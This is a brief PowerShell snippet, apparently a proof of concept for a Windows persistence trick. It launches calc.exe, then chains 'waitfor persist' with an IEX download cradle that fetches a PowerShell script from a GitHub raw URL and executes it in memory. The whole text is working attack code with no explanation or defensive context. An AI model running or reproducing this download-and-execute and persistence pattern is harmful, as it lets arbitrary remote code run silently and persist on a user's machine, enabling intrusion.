$example_code = start-process calc.exe
Write-Host $example_code -ForegroundColor Green
$example_code
cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1')
